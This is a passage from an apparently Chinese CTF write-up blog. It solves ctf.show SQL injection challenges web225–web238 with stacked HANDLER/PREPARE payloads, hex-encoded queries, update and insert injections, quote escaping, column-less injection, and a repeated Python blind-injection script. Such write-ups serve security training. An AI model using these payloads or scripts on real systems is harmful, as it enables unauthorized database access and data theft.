<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个表名为 tbl_name 的表的句柄</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、通过索引查看表</span></span><br><span class="line"><span class="comment"># FIRST: 获取第一行（索引最小的一行）</span></span><br><span class="line"><span class="comment"># NEXT: 获取下一行</span></span><br><span class="line"><span class="comment"># PREV: 获取上一行</span></span><br><span class="line"><span class="comment"># LAST: 获取最后一行（索引最大的一行）</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、不通过索引查看表</span></span><br><span class="line"><span class="comment"># READ FIRST: 获取句柄的第一行</span></span><br><span class="line"><span class="comment"># READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）</span></span><br><span class="line"><span class="comment"># 最后一行执行之后再执行 READ NEXT 会返回一个空的结果</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭已打开的句柄</span></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure></div>

<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://76114b3b-7ffd-4016-8b00-b96feb693fd8.challenge.ctf.show:<span class="number">8080</span>/api/?username=ctfshow<span class="string">';handler ctfshow_flagasa open;handler ctfshow_flagasa read first--+</span></span><br></pre></td></tr></table></figure></div>

<p><strong>第二种做法预处理</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> @tn = <span class="string">'hahaha'</span>;  //存储表名</span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span> = <span class="keyword">concat</span>(<span class="string">'select * from '</span>, @tn);  //存储SQL语句</span><br><span class="line"><span class="keyword">PREPARE</span> <span class="keyword">name</span> <span class="keyword">from</span> @<span class="keyword">sql</span>;   //预定义SQL语句</span><br><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">name</span>;  //执行预定义SQL语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla;  //删除预定义SQL语句</span><br></pre></td></tr></table></figure></div>

<p>因为concat连接之后直接就是字符串，所以就直接构造payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://76114b3b-7ffd-4016-8b00-b96feb693fd8.challenge.ctf.show:<span class="number">8080</span>/api/?username=ctfshow<span class="string">';show tables;prepare gylq from concat('</span>s<span class="string">','</span>elect<span class="string">','</span> * <span class="keyword">from</span> ctfshow_flagasa<span class="string">');execute gylq;--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><blockquote>
<ul>
<li>预处理from后面可以跟十六进制，所以可以有更骚的姿势，直接将<code>select * from ctfsh_ow_flagas</code>转换成<code>0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173</code>就可以直接语句执行</li>
</ul>
</blockquote>
<p>payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://bbec116e-8f61-487c-8966-9384be4efe14.challenge.ctf.show:<span class="number">8080</span>/api/?username=userAUTO<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;execute gylq--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><blockquote>
<ul>
<li>搜了个遍，没找到flag，最后发现information_schema.routines这个表是存放函数和存储过程字段的。我们查看一下这个表，关于函数的存储过程，看看网上这篇文章<a href="https://blog.csdn.net/qq_41573234/article/details/80411079" target="_blank" rel="noopener">MySQL——查看存储过程和函数</a></li>
</ul>
</blockquote>
<p><strong>payload，查看routines的所有字段和数据</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://faa7806b-aae1-4405-8c64-1600655bcd26.challenge.ctf.show:<span class="number">8080</span>/api/?username=user1<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E726F7574696E6573;execute gylq;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801141034167.png" alt="image-20210801141034167"></p>
<p>可以直接用<code>1&#39;;call getflag();</code>来调用这个函数，不过这个所有字段里已经可以找到flag</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801141215295.png" alt="image-20210801141215295"></p>
<h2 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h2><blockquote>
<ul>
<li>和web226一样的做法，转十六进制</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://abd0d622-b6b8-48c7-98f3-9a49f3996b1b.challenge.ctf.show:<span class="number">8080</span>/api/?username=user1<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D2063746673685F6F775F666C616761736161;execute gylq;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h2><blockquote>
<ul>
<li>和上题一样,估计没招了</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://74ea40ed-fc20-471c-8d2e-05cbd44aadad.challenge.ctf.show:<span class="number">8080</span>/api/?username=user1<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D20666C6167;execute gylq;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h2><blockquote>
<ul>
<li>堆叠注入的精髓就是预处理和转十六进制么，和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://bde7f4f9-1def-42cf-afee-da3025b6550a.challenge.ctf.show:<span class="number">8080</span>/api/?username=user1<span class="string">';prepare gylq from 0x73656C656374202A2066726F6D20666C61676161626278;execute gylq;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><blockquote>
<ul>
<li>我看到第一眼，就想着写个脚本，看了别人wp发现不用写布尔脚本，但是我写了，所以就用脚本梭哈</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateNum(num):</span></span><br><span class="line"><span class="comment">#     res = 'true'</span></span><br><span class="line"><span class="comment">#     if num == 1:</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         for i in range(num-1):</span></span><br><span class="line"><span class="comment">#             res += "+true"</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://06b28180-71ea-4f89-a05a-7d6baaf18696.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#password=1234567811&amp;username=ctfshow' and if(substr(database(),1,1)='c',1,0)#</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flaga'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select group_concat(flagas) from flaga"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"ctfshow' and if(substr((&#123;&#125;),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计数</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'username'</span> : payload.format(sql,i,j),</span><br><span class="line">            <span class="string">'password'</span> : <span class="string">"&#123;&#125;"</span>.format(i)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url, data = params)</span><br><span class="line">        <span class="comment">#print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u66f4\u65b0\u6210\u529f"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>第二种方式，了解一下性质，学习学习。</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">$sql = "<span class="keyword">update</span> ctfshow_user <span class="keyword">set</span> pass = <span class="string">'&#123;$password&#125;'</span> <span class="keyword">where</span> username = <span class="string">'&#123;$username&#125;'</span>;";</span><br></pre></td></tr></table></figure></div>

<p>他语句是这样，那我们拼接一下成</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass &#x3D; &#39;1&#39;,username&#x3D;database()# where username &#x3D; &#39;&#123;$username&#125;&#39;; #后面就的被注释掉了</span><br></pre></td></tr></table></figure></div>

<p><strong>就有这样的效果</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801150934264.png" alt="image-20210801150934264"></p>
<p><strong>这样不就任意语句执行了。</strong></p>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=ctfshow&amp;password=1' ,username=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><strong>拿flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=ctfshow&amp;password=1' ,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flagas) <span class="keyword">from</span> flaga)<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801151123611.png" alt="image-20210801151123611"></p>
<h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><blockquote>
<ul>
<li>上把盲注脚本直接梭哈，只不过加了个给密码md5加密而已，并没有改变之前代码的性质，我代码跟用户名有关，所以不变</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateNum(num):</span></span><br><span class="line"><span class="comment">#     res = 'true'</span></span><br><span class="line"><span class="comment">#     if num == 1:</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         for i in range(num-1):</span></span><br><span class="line"><span class="comment">#             res += "+true"</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://258da519-591d-4f61-b9af-c91ccb7af34f.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#password=1234567811&amp;username=ctfshow' and if(substr(database(),1,1)='c',1,0)#</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flagaa'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select group_concat(flagass) from flagaa"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"ctfshow' and if(substr((&#123;&#125;),&#123;&#125;,1)='&#123;&#125;',1,0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计数</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'username'</span> : payload.format(sql,i,j),</span><br><span class="line">            <span class="string">'password'</span> : <span class="string">"&#123;&#125;"</span>.format(i)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url, data = params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r"\u66f4\u65b0\u6210\u529f"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801152819566.png" alt="image-20210801152819566"></p>
<p><strong>注意，用了第一种方法的时候不要用第二种方法，容易打乱代码条件,同样的第二种方法也就是加了个括号paylaod</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=ctfshow&amp;password=12'),username=(database())<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801151650299.png" alt="image-20210801151650299"></p>
<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><blockquote>
<ul>
<li>发现连着三题都可以用第一个盲注脚本跑出来，继续梭哈</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">import requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateNum(num):</span></span><br><span class="line"><span class="comment">#     res = 'true'</span></span><br><span class="line"><span class="comment">#     if num == 1:</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         for i in range(num-1):</span></span><br><span class="line"><span class="comment">#             res += "+true"</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = "http://8feb46d5-de26-4836-807f-3d7218bcb7ae.challenge.ctf.show:<span class="number">8080</span>/api/<span class="string">"</span></span><br><span class="line"><span class="string">str = "</span><span class="number">01234567890</span>abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，<span class="string">"</span></span><br><span class="line"><span class="string">flag = ""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#password=1234567811&amp;username=ctfshow' and if(substr(database(),1,1)='c',1,0)#</span></span><br><span class="line"><span class="string">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="string">#--------查表</span></span><br><span class="line"><span class="string">#sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="string">"</span></span><br><span class="line"><span class="string">#--------查字段</span></span><br><span class="line"><span class="string">#sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag233333'</span><span class="string">"</span></span><br><span class="line"><span class="string">#--------查flag</span></span><br><span class="line"><span class="string">sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(flagass233) <span class="keyword">from</span> flag233333<span class="string">"</span></span><br><span class="line"><span class="string">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = "</span>ctfshow<span class="string">' and if(substr((&#123;&#125;),&#123;&#125;,1)='</span>&#123;&#125;<span class="string">',1,0)#"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#计数</span></span><br><span class="line"><span class="string">n = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(1, 666):</span></span><br><span class="line"><span class="string">    for j in str:</span></span><br><span class="line"><span class="string">        params = &#123;</span></span><br><span class="line"><span class="string">            '</span>username<span class="string">' : payload.format(sql,i,j),</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">password</span><span class="string">' : "&#123;&#125;".format(i)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res = requests.post(url = url, data = params)</span></span><br><span class="line"><span class="string">        if r"\u66f4\u65b0\u6210\u529f" in res.text:</span></span><br><span class="line"><span class="string">            flag += j</span></span><br><span class="line"><span class="string">            n += 1</span></span><br><span class="line"><span class="string">            print('</span>[*] 开始盲注第&#123;&#125;位<span class="string">'.format(n))</span></span><br><span class="line"><span class="string">            print(flag)</span></span><br><span class="line"><span class="string">            if j == "&#125;":</span></span><br><span class="line"><span class="string">                print('</span>[*] flag <span class="keyword">is</span> &#123;&#125;<span class="string">'.format(flag))</span></span><br><span class="line"><span class="string">                exit()</span></span><br><span class="line"><span class="string">            break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><blockquote>
<ul>
<li>脚本跑不动了，过滤了单引号，这题考的是\实现单引号逃逸</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">原来的语句</span><br><span class="line"><span class="keyword">update</span> ctfshow_user <span class="keyword">set</span> pass = </span><br><span class="line"><span class="string">'&#123;$password&#125;'</span> <span class="keyword">where</span> username = <span class="string">'&#123;$username&#125;'</span>;</span><br><span class="line">加上\逃逸单引号</span><br><span class="line"><span class="keyword">update</span> ctfshow_user <span class="keyword">set</span> pass = </span><br><span class="line"><span class="string">'\'</span> <span class="keyword">where</span> username = <span class="string">'&#123;$username&#125;'</span>;</span><br><span class="line">pass里面的内容则变成' where username = </span><br><span class="line">username里面的值我们可以随意控制</span><br></pre></td></tr></table></figure></div>

<p><strong>查表payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())<span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801160115328.png" alt="image-20210801160115328"></p>
<p>查字段<strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="number">0x666C6167323361</span>)<span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p>查<strong>flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flagass23s3) <span class="keyword">from</span> flag23a)<span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><blockquote>
<ul>
<li>这题过滤了information，ban了or和’，我们只能去找mysql里面的可以查表的表<code>mysql.innodb_table_stats</code>但是发现找不到其他里面包含字段的表了。所以只能想到无列名注入</li>
</ul>
</blockquote>
<p>可以参考一下</p>
<p><a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">概述MySQL统计信息</a><br><a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">CTF|mysql之无列名注入</a></p>
<p><strong>查表</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats )<span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p><strong>payload查flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="string">`2`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flag23a1)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) <span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801164011222.png" alt="image-20210801164011222"></p>
<h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><blockquote>
<ul>
<li>他多过滤了一个flag，一样可以用上一个payload</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="string">`2`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flaga)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) <span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p><strong>我感觉没过滤，如果真过滤了，也可以base64转过去</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;,username&#x3D;(select to_base64(&#96;2&#96;) from (select 1,2,3 union select * from flaga)a limit 1,1) #&amp;password&#x3D;\</span><br></pre></td></tr></table></figure></div>

<h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><blockquote>
<ul>
<li>经典insert注入</li>
</ul>
</blockquote>
<p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()));<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>查字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag'</span>));<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span> flagass23s3 <span class="keyword">from</span> flag));<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><blockquote>
<ul>
<li>过滤了空格，用括号</li>
</ul>
</blockquote>
<p>查表</p>
